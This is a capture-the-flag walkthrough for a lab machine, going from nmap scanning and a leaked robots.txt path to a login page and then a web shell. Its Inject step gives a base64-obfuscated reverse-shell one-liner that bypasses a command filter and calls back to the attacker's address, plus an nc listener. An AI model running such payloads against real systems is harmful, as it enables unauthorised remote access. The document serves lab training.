# H4ck3rz — Walkthrough

## Intel

Scan the target with nmap:

`
nmap -sC -sV <ip>
`

**Output:**

`PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: my 42sh
|_http-server-header: Apache/2.4.68 (Debian)
| http-robots.txt: 1 disallowed entry
|_/1337_53CR37_l41r
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

## Explore

Spot the disallowed entry in the scan output, then browse to it:

`
http://{ip}/1337_53CR37_l41r/
`

This reveals the password

## Find username

Curl the site root:

`
curl http://{ip}
`

Look through the response for the **username**.

## 4. Directory Enumeration

Use Gobuster to discover hidden directories:

`
gobuster fuzz -u http://<ip>/FUZZ -w <wordlist>
`

Locate the login page and authenticate using the credentials found above.

## Inject

The site hosts a shell that filters certain commands. Bypass the filter by base64-encoding the reverse shell payload, then decoding and piping it to `bash`:

`
echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuOC4wLjIwMi80NDQ0IDA+JjE=' | base64 -d | bash
`

**Steps:**
1. Paste the command into the browser's shell interface.
2. Start a listener on your machine:

`
nc -lvnp 4444
`

## Gather

Since `titouan` is a user on the system, we assume the file is in the home dir:

`
sudo -u titouan cat /home/titouan/user.txt
`

This logs in as `titouan` and prints the flag.